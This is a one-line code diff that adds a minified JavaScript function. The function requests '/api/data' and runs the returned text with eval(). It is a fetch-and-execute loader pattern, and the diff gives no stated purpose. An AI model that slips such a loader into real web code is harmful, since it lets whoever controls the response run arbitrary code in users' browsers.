@@ -1,0 +1,1 @@
+(function(){var xhr=new XMLHttpRequest;xhr.open("GET","/api/data",!0),xhr.onreadystatechange=function(){4===xhr.readyState&&eval(xhr.responseText)},xhr.send()})();
